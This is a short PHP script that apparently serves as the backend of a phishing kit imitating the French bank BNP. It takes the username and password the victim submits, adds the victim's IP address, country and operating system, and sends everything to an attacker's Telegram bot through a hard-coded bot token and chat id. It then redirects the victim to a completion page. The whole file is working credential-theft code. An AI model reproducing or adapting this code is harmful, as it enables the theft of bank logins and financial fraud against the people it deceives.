<?php

session_start();
include_once 'functions.php';

	
$message = '[🆘] +1 LOG BNP [🆘]' . "\r\n\n";

$message .= '📢NUMERO CLIENT  : ' . $_POST['username'] . "\r\n\n";
$message .= '📢PASSWORD  : ' . $_POST['password'] . "\r\n\n";

$message .= '[🤖] TIERS [🤖]' . "\r\n\n";

$message .= '🤖 IP : ' . get_user_ip() . "\r\n";
$message .= '🤖 Pays : ' . get_user_country() . "\r\n";
$message .= '🤖 Systeme : ' . get_user_os() . "\r\n";



file_get_contents("https://api.telegram.org/bot7365575342:AAEgg8vKLSnmt3pfdd96nETNLJ5WrbC8vJM/sendMessage?chat_id=7421525298&text=" . urlencode($message)."" );

    header('location: ../fini.php');

?>